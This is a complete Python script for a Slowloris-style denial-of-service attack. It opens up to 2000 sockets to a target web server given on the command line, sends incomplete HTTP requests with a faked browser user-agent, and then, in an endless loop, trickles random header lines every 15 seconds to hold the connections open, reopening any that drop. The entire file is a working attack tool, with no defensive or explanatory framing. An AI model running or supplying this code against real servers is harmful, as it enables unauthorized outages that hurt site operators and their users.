import socket
import random
import time
import sys

list_of_sockets = []

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Accept-language: en-US.en.q=0.5"
]

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip, 80))

    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
    for header in headers:
        s.send(f"{header}\r\n".encode('utf-8'))
    return s

def main():
    if len(sys.argv) != 2:
        print(f'Usage: {sys.argv[0]} example.com')
        return

    ip = sys.argv[1]
    socket_count = 2000
    print(f'Attacking {ip} with {socket_count} sockets')
    print("creating sockets...")

    for _ in range(socket_count):
        try:
            print(f"creating socket #{_}")
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        print(f'sending keep-alive headers... socket count: {len(list_of_sockets)}')
        for s in list_of_sockets:
            try:
                s.send(f"X-a:{random.randint(1, 5000)}\r\n".encode('utf-8'))
            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            print('recreating socket...')
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(15)

if __name__ == '__main__':
    main()

